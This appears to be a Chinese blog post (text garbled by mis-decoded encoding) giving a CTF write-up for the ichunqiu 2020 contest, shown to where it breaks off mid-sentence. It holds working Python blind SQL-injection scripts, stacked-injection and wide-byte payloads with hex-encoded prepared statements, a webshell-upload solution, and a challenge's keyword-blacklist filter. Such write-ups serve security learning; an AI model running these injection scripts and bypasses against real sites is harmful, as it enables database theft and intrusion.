<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><!--!--><title>ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp - ggb0n&#039;s Blog</title><meta description="æœ€è¿‘çš„å‡ ä¸ªå…¬ç›Šèµ›ç¡®å®åŠçš„ä¸é”™ï¼Œå®‰å…¨äººå‘˜ä¹Ÿéƒ½æ˜¯å¾ˆçƒ­çˆ±ç¥–å›½çš„â™¥ï¼Œä¸­å›½åŠ æ²¹ğŸ˜  æ­¦æ±‰åŠ æ²¹ğŸ˜  å¤§å®¶åŠ æ²¹ğŸ˜ "><meta property="og:type" content="article"><meta property="og:title" content="ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp"><meta property="og:url" content="http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/"><meta property="og:site_name" content="ggb0n&#039;s blog"><meta property="og:description" content="æœ€è¿‘çš„å‡ ä¸ªå…¬ç›Šèµ›ç¡®å®åŠçš„ä¸é”™ï¼Œå®‰å…¨äººå‘˜ä¹Ÿéƒ½æ˜¯å¾ˆçƒ­çˆ±ç¥–å›½çš„â™¥ï¼Œä¸­å›½åŠ æ²¹ğŸ˜  æ­¦æ±‰åŠ æ²¹ğŸ˜  å¤§å®¶åŠ æ²¹ğŸ˜ "><meta property="og:locale" content="en_US"><meta property="og:image" content="http://ggb0n.cool/images/icon2.png"><meta property="article:published_time" content="2020-02-21T14:14:19.000Z"><meta property="article:modified_time" content="2020-04-16T07:45:25.760Z"><meta property="article:author" content="ggb0n"><meta property="article:tag" content="SSRF"><meta property="article:tag" content="SQLæ³¨å…¥"><meta property="article:tag" content="ååºåˆ—åŒ–æ¼æ´"><meta property="article:tag" content="ååºåˆ—åŒ–é€ƒé€¸æ¼æ´"><meta property="article:tag" content="å †å æ³¨å…¥"><meta property="article:tag" content="bypass functions_disable"><meta property="article:tag" content="RSAæ”»å‡»"><meta property="article:tag" content="SSTI"><meta property="article:tag" content="æ—¶é—´ç›²æ³¨"><meta property="article:tag" content="å®½å­—èŠ‚æ³¨å…¥"><meta property="article:tag" content="åˆ©ç”¨æ­£åˆ™æ³¨å…¥"><meta property="article:tag" content="åˆ©ç”¨Handleræ³¨å…¥"><meta property="article:tag" content="åˆ©ç”¨é¢„å¤„ç†è¯­å¥è¿›è¡Œå †å æ³¨å…¥"><meta property="article:tag" content="å¤šåˆ—æ•°æ®çˆ†ç ´æ³¨å…¥"><meta property="article:tag" content="PDF417è¯†åˆ«"><meta property="article:tag" content="F5éšå†™"><meta property="article:tag" content="ThinkPHP6.0-é€šè¿‡SEESIONå†™æ–‡ä»¶æ¼æ´"><meta property="article:tag" content="Rabinç®—æ³•æ”»å‡»"><meta property="article:tag" content="RSAå…±æ¨¡æ”»å‡»"><meta property="article:tag" content="JSåŸå‹é“¾æ±¡æŸ“"><meta property="article:tag" content="CRLFæ³¨å…¥"><meta property="article:tag" content="Node jsç¼–ç å®‰å…¨"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://ggb0n.cool/images/icon2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/"},"headline":"ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp","image":["http://www.ggb0n.cool/images/back2.png"],"datePublished":"2020-02-21T14:14:19.000Z","dateModified":"2020-04-16T07:45:25.760Z","author":{"@type":"Person","name":"ggb0n"},"description":"æœ€è¿‘çš„å‡ ä¸ªå…¬ç›Šèµ›ç¡®å®åŠçš„ä¸é”™ï¼Œå®‰å…¨äººå‘˜ä¹Ÿéƒ½æ˜¯å¾ˆçƒ­çˆ±ç¥–å›½çš„â™¥ï¼Œä¸­å›½åŠ æ²¹ğŸ˜  æ­¦æ±‰åŠ æ²¹ğŸ˜  å¤§å®¶åŠ æ²¹ğŸ˜ "}</script><link rel="alternative" href="/atom.xml" title="ggb0n&#039;s Blog" type="application/atom+xml"><link rel="icon" href="http://www.ggb0n.cool/images/icon2.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><script src="/js/md5.min.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">é¦–é¡µ</a><a class="navbar-item" href="/archives">å½’æ¡£</a><a class="navbar-item" href="/categories">åˆ†ç±»</a><a class="navbar-item" href="/tags">æ ‡ç­¾</a><a class="navbar-item" href="/friend">å‹é“¾</a><a class="navbar-item" href="/message">ç•™è¨€</a><a class="navbar-item" href="/about">å…³äº</a><a class="navbar-item" href="/tools">å·¥å…·</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="thumbnail" src="http://ggb0n.cool/images/icq-top.jpg" alt="ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp"></span></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-21T14:14:19.000Z">2020-02-21</time><a class="commentCountImg" href="/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/#comment-container"><span class="display-none-class">7d1a9a19919444f070c494058441919e</span><img class="not-gallery-item" src="/img/chat.svg">Â <span class="commentCount" id="7d1a9a19919444f070c494058441919e">Â 99+</span>Â Â Â Â </a><span class="level-item">an hour read (About 9247 words)</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span> visits</span></div></div><h1 class="title is-3 is-size-4-mobile">ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp</h1><div class="content"><p>æœ€è¿‘çš„å‡ ä¸ªå…¬ç›Šèµ›ç¡®å®åŠçš„ä¸é”™ï¼Œå®‰å…¨äººå‘˜ä¹Ÿéƒ½æ˜¯å¾ˆçƒ­çˆ±ç¥–å›½çš„â™¥ï¼Œä¸­å›½åŠ æ²¹ğŸ˜  æ­¦æ±‰åŠ æ²¹ğŸ˜  å¤§å®¶åŠ æ²¹ğŸ˜ <a id="more"></a></p>
<h2 id="Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"><a href="#Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ" class="headerlink" title="Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"></a>Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ</h2><p>è€ƒå¯ŸSQLæ³¨å…¥</p>
<h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æµ‹è¯•å‘ç°ç™»å½•çš„<code>username</code>å¤„å­˜åœ¨æ³¨å…¥ï¼Œä¸‡èƒ½å¯†ç å°±èƒ½ç™»å½•<br><img src="http://www.ggb0n.cool/images/ichunqiu0.png" alt=""><br>è¿™ä¸ªåœ°æ–¹å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¯ä»¥åˆ©ç”¨ç›²æ³¨çˆ†åº“ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ€è·¯å°±æ˜¯é€šè¿‡åˆ¤æ–­ç”¨æˆ·åçš„æ¡ä»¶ä¸º<code>true</code>ç™»å½•è¿›è¡Œæ³¨å…¥ï¼Œå½“ç„¶è¿˜éœ€è¦ä¸€ä¸ªç°æœ‰çš„ç”¨æˆ·æ¥ç™»å½•ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³¨å†Œä¸ªç”¨æˆ·å°±è¡Œäº†ï¼Œå‚è€ƒå¦‚ä¸‹çš„è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://4b5b40858ffa4258bd74ee72c106522abdc060eb08674169.changame.ichunqiu.com/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select database()),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select table_name from information_schema.tables where table_schema='nzhaopin' limit 1 offset 3),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select column_name from information_schema.columns where table_name='flag' limit 1 offset 1),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line">payload = <span class="string">"2' and (select (mid((select flaaag from flag limit 1 offset 0),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># backup flag  user           flag: id  flaaag</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_-&#123;&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"lname"</span>: payload.format(i, database + n),</span><br><span class="line">            <span class="string">"lpass"</span>: <span class="string">"xxx"</span></span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url, data=data)</span><br><span class="line">        req.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="comment"># print(req.encoding)</span></span><br><span class="line">        print(data[<span class="string">"lname"</span>])</span><br><span class="line">        <span class="comment"># print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"æˆåŠŸ"</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text.encode(<span class="string">'gbk'</span>).decode(req.apparent_encoding):</span><br><span class="line">            print(<span class="string">"*                      "</span> + n)</span><br><span class="line">            database += n</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-ezupload"><a href="#Web-ezupload" class="headerlink" title="Web-ezupload"></a>Web-ezupload</h2><p>æ–‡ä»¶ä¸Šä¼ é¢˜</p>
<h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æœ¬ä»¥ä¸ºæ˜¯ä¸€é“æ‹å¼¯çš„ä¸Šä¼ é¢˜ï¼Œç»“æœç›´æ¥ä¼ ä¸Šé©¬äº†â€¦<br>èšå‰‘è¿ä¸Šï¼Œ<code>flag</code>æ–‡ä»¶æ˜¯ç©ºçš„ï¼Œä½†æ˜¯ä¸‹é¢æœ‰ä¸ª<code>/readflag</code>æ–‡ä»¶ï¼Œå¼€ä¸­æ–­è¿è¡Œè¿™ä¸ªç¨‹åºå°±èƒ½æ‹¿åˆ°flagã€‚<br><img src="http://www.ggb0n.cool/images/ichunqiu2.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu3.png" alt=""></p>
<h2 id="Web-ç›²æ³¨"><a href="#Web-ç›²æ³¨" class="headerlink" title="Web-ç›²æ³¨"></a>Web-ç›²æ³¨</h2><p>åˆ©ç”¨æ­£åˆ™è¿›è¡Œæ—¶é—´ç›²æ³¨</p>
<h3 id="è§£é¢˜-2"><a href="#è§£é¢˜-2" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>é¢˜ç›®å·²ç»è¯´çš„å¾ˆæ˜æ˜¾äº†ï¼Œéœ€è¦è¿›è¡Œç›²æ³¨ï¼Œä½†æ˜¯æœ‰wafï¼Œè¿‡æ»¤äº†å¾ˆå¤šå¸¸ç”¨çš„æ³¨å…¥è¯­å¥ï¼Œä½†æ˜¯<code>REGEXP</code>å¹¶æ²¡æœ‰è¢«banï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸ªå‡½æ•°å¾ˆç®€å•åœ°å°±èƒ½æ‹¿åˆ°flagã€‚<br><code>REGEXP</code>ï¼šåœ¨åˆ—å€¼å†…è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœè¢«åŒ¹é…çš„æ–‡æœ¬åœ¨åˆ—å€¼ä¸­å‡ºç°ï¼Œ<code>REGEXP</code>å°†ä¼šæ‰¾åˆ°å®ƒï¼Œç›¸åº”çš„è¡Œå°†è¢«è¿”å›ï¼Œ<code>REGEXP</code>èƒ½åŒ¹é…æ•´ä¸ªåˆ—å€¼ã€‚å¹¶ä¸”<code>REGEXP</code>æ£€æŸ¥æ€»æ˜¯è¿”å›<code>0ï¼ˆæ²¡æœ‰åŒ¹é…ï¼‰</code>æˆ–<code>1ï¼ˆåŒ¹é…ï¼‰</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://49682a5d648a44fe94ba09271ec5fbe569c33f63b1c6435b.changame.ichunqiu.com/?id='</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            payload = <span class="string">'1 and if((fl4g    REGEXP "^&#123;0&#125;"),sleep(3),5);'</span></span><br><span class="line">            payload = payload.format(flag+n)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            req = requests.get(url+payload)</span><br><span class="line">            <span class="comment">#print(req.text)</span></span><br><span class="line">            <span class="keyword">if</span> (time.time() - start_time)&gt;<span class="number">2</span>:</span><br><span class="line">                print(flag)</span><br><span class="line">                flag += n</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-blacklist"><a href="#Web-blacklist" class="headerlink" title="Web-blacklist"></a>Web-blacklist</h2><p>æœ¬é¢˜æ˜¯[å¼ºç½‘æ¯]éšä¾¿æ³¨çš„æ”¹ç‰ˆï¼Œè€ƒå¯Ÿå †å æ³¨å…¥ï¼Œè¿™é¢˜getåˆ°æ³¨å…¥æ–°å§¿åŠ¿ï¼Œåˆ©ç”¨<code>mysql</code>æ•°æ®åº“ä¸­<code>HANDLER</code>ç»•è¿‡é»‘åå•æ‹¿flagã€‚</p>
<h3 id="è§£é¢˜-3"><a href="#è§£é¢˜-3" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®å‘ç°è·Ÿå¼ºç½‘æ¯ä¸€æ ·çš„è¾“å…¥æ¡†ï¼Œé¦–å…ˆå°±æƒ³åˆ°äº†å †å æ³¨å…¥ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu4.png" alt=""><br>å¯ä»¥çœ‹åˆ°ï¼Œè¯­æ³•æˆåŠŸæ‰§è¡Œäº†ã€‚<br>ä½†æ˜¯å†å»æµ‹è¯•å…¶ä»–å…³é”®å­—çš„æ—¶å€™å‘ç°å¾ˆå¤šå…³é”®å­—è¢«banäº†ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu5.png" alt=""><br>æœ¬æƒ³ç€åˆ©ç”¨å¼ºç½‘æ¯çš„æ–¹æ³•ï¼Œé€šè¿‡æ”¹è¡¨åæ¥æ‹¿flagçš„ï¼Œä½†æ˜¯<code>rename</code>ä¹Ÿè¢«banäº†ï¼Œç»“åˆ<code>select</code>åˆè¢«banï¼Œå¸¸è§„çš„å§¿åŠ¿æ€•æ˜¯ä¸è¡Œï¼Œåæ¥å€Ÿç”¨<code>handler</code>æ‰æ‹¿åˆ°flagï¼Œpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="http://www.ggb0n.cool/images/ichunqiu6.png" alt=""><br>å…³äº<code>handler</code>å¯ä»¥å‚è€ƒ<a href="https://www.jb51.net/article/88732.htm">è¿™é‡Œ</a>ã€‚</p>
<h2 id="Web-easysqli-copy"><a href="#Web-easysqli-copy" class="headerlink" title="Web-easysqli_copy"></a>Web-easysqli_copy</h2><p>è¿˜æ˜¯è€ƒå¯ŸPDOã€check()å‡½æ•°çš„ç»•è¿‡ã€å®é™…ç›²æ³¨ï¼Œä¸è¿‡è¿™é¢˜ä¹Ÿgetåˆ°äº†æ–°å§¿åŠ¿ï¼šåˆ©ç”¨<code>é¢„å¤„ç†è¯­å¥</code>è¿›è¡Œå †å æ³¨å…¥ï¼Œè¿™ä¹Ÿæ˜¯é‡‡ç”¨äº†PDOä¹‹åæ³¨å…¥çš„æ–°è¶‹åŠ¿äº†ã€‚<br>æ‰©å±•ä¸€ä¸‹çŸ¥è¯†ï¼š</p>
<blockquote>
<p>åœ¨phpä¸­ï¼Œ<code>PDO</code>æœ‰ä¸¤ç§æ¨¡å¼ï¼š<code>æ¨¡æ‹Ÿé¢„ç¼–è¯‘</code>ä¸<code>éæ¨¡æ‹Ÿé¢„ç¼–è¯‘</code>ã€‚é»˜è®¤ä¸ºæ¨¡æ‹Ÿé¢„ç¼–è¯‘æ¨¡å¼ï¼Œå³ä¸æ˜¯çœŸæ­£çš„é¢„ç¼–è¯‘ï¼Œè€Œæ˜¯é‡‡ç”¨<code>PDO::quote()</code>å‡½æ•°ï¼Œé¦–å…ˆå°†ç”¨æˆ·è¾“å…¥è½¬åŒ–ä¸ºå­—ç¬¦å‹ï¼Œä¹‹åå°†å¼•å·ç­‰æ•æ„Ÿå­—ç¬¦è½¬ä¹‰ã€‚è¿™æ ·åœ¨<code>gbk</code>ç¼–ç ä¸‹ï¼Œå³å¯é€šè¿‡å®½å­—èŠ‚æ³¨å…¥ç»•è¿‡é˜²æŠ¤ã€‚<br>ä½†æ˜¯ç»•è¿‡PDOä¹‹åï¼Œä¾ç„¶å¾ˆéš¾ç»•è¿‡<code>check()</code>å‡½æ•°ï¼Œäºæ˜¯æ­¤å¤„åˆ©ç”¨åˆ°äº†PDOçš„ç¬¬äºŒä¸ªé»˜è®¤ç‰¹æ€§ï¼šæ”¯æŒ<code>å¤šå¥æ‰§è¡Œ</code>ï¼Œå³å¯è¿›è¡Œå †å æ³¨å…¥ã€‚</p>
</blockquote>
<h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ç»™å‡ºäº†æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class="line">        &#123;</span><br><span class="line">            print_r($matches);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $test = $db-&gt;query(<span class="string">"select balabala from table1"</span>);</span><br><span class="line">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        $id = $res[<span class="string">'balabala'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check($id))</span><br><span class="line">    &#123;</span><br><span class="line">        $query = <span class="string">"select balabala from table1 where 1=?"</span>;</span><br><span class="line">        $db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">        $row = $db-&gt;prepare($query);</span><br><span class="line">        $row-&gt;bindParam(<span class="number">1</span>,$id);</span><br><span class="line">        $row-&gt;execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æºç å‘ç°ï¼Œè¿™é‡Œåˆ©ç”¨äº†<a href="https://www.runoob.com/php/pdo-query.html">PDO</a>æ¥å£è¿›è¡Œä¸æ•°æ®åº“çš„é“¾æ¥ï¼Œå…¶ä¸­<code>prepare</code>å°±æ˜¯å‡†å¤‡äº†ä¸€ä¸ªé¢„å¤„ç†è¯­å¥ï¼Œ<code>$row-&gt;bindParam(1,$id);</code>ä¸­çš„<a href="https://www.runoob.com/php/pdostatement-bindparam.html">binParam</a>ä½œç”¨æ˜¯ç»‘å®šä¸€ä¸ªå‚æ•°åˆ°æŒ‡å®šçš„å˜é‡åã€‚<br>è¯·æ•™åˆ«çš„å¸ˆå‚…äº†è§£åˆ°PDOä¸­å•å¼•å·å¯èƒ½æ˜¯è¢«è‡ªåŠ¨è¿‡æ»¤çš„ï¼Œé‚£å°±åªå¥½åˆ©ç”¨å®½å­—èŠ‚ç»•è¿‡ï¼š<code>%df%27</code>ï¼Œæºç é‡Œåˆ©ç”¨äº†é¢„å¤„ç†è¯­å¥ï¼Œæ³¨å…¥çš„æ—¶å€™ä¹Ÿå°±é€‰æ‹©äº†åˆ©ç”¨é¢„å¤„ç†è¯­å¥è¿›è¡Œæ³¨å…¥ï¼ŒåŒæ—¶ç»“åˆ16è¿›åˆ¶ç¼–ç ç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤ã€‚</p>
<h3 id="è§£é¢˜-4"><a href="#è§£é¢˜-4" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://96e2f11ccc1147559b9e8c7c9991e494c4dd1d4ca36f4428.changame.ichunqiu.com/?id=1%df%27;'</span></span><br><span class="line">    payloads = <span class="string">"set @a=0x&#123;0&#125;;prepare ctftest from @a; execute ctftest;"</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        print(<span class="string">"å‰&#123;0&#125;ä½"</span>.format(m))</span><br><span class="line">        payload = <span class="string">"select if (ascii(mid((select fllllll4g from table1 ),&#123;0&#125;,1))=&#123;1&#125;, sleep(3), 1)"</span>  <span class="comment"># ç”±äºæˆ‘ä»¬ä¼šè½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œæ‰€ä»¥ä¸å­˜åœ¨ä»»ä½•è¿‡æ»¤ï¼Œå…³é”®è¯éšä¾¿ä½¿ç”¨</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="comment"># print(payload.format(m, n))</span></span><br><span class="line">            xxx = url + payloads.format(str_to_hex(payload.format(m, ord(n))))</span><br><span class="line">            <span class="comment"># print(xxx)</span></span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(xxx)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:</span><br><span class="line">                flag += n</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])  <span class="comment"># å­—ç¬¦ä¸²è½¬æ¢ä¸º16è¿›åˆ¶çš„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="Web-Easqli"><a href="#Web-Easqli" class="headerlink" title="Web-Easqli"></a>Web-Easqli</h2><p>è€ƒå¯Ÿç›²æ³¨ï¼Œè¿™é¢˜ä¹Ÿå­¦åˆ°äº†æ–°å§¿åŠ¿ï¼šåœ¨<code>union select</code>è¢«bançš„æƒ…å†µä¸‹ï¼Œè¿›è¡Œ<code>å¤šåˆ—</code>æ•°æ®çš„çˆ†ç ´ã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªå¤§å¤§çš„è¾“å…¥æ¡†ï¼Œå¤šæ¬¡å°è¯•å‘ç°è¾“å…¥<code>1</code>çš„æ—¶å€™å›æ˜¾<code>Hello Nu1L</code>ï¼Œè¾“å…¥<code>0</code>çš„æ—¶å€™å›æ˜¾<code>hello</code>ï¼Œåæ¥æµ‹è¯•äº†å¤šä¸ªå…³é”®å­—ï¼Œå‘ç°<code>union select</code>å•ç”¨çš„æ—¶å€™æ²¡é—®é¢˜ï¼Œè”åˆèµ·æ¥ä½¿ç”¨æ€ä¹ˆéƒ½ç»•ä¸è¿‡ï¼Œ<code>or</code>ã€<code>and</code>ä¹Ÿè¢«banäº†ï¼Œä½†æ˜¯<code>&amp;&amp;</code>æ²¡è¢«banï¼Œè¿™é‡Œæœ‰æå¤´ï¼Œç„¶åæµ‹äº†ä¸€ä¸‹ï¼Œè¯­å¥ä¸º<code>true</code>å›æ˜¾ä¹Ÿæ˜¯<code>hello Nu1L</code>ï¼Œå°±ä»è¿™é‡Œä¸‹æ‰‹äº†ã€‚<br>åæ¥åˆå‘ç°<code>information_schema</code>ä¹Ÿè¢«banäº†ï¼Œè¿™æ—¶å€™æƒ³åˆ°äº†ä¹‹å‰ä¸€ä¸ªé¢˜é‡Œè®²è¿‡çš„ï¼šåˆ©ç”¨mysqlç³»ç»Ÿåº“<code>sys.schema_table_statistics_with_buffer</code>æˆ–è€…<code>sys.schema_auto_increment_columns</code>è·å–åˆ°äº†è¡¨åï¼Œä½†æ˜¯å› ä¸º<code>union select</code>è¢«banï¼Œæ— 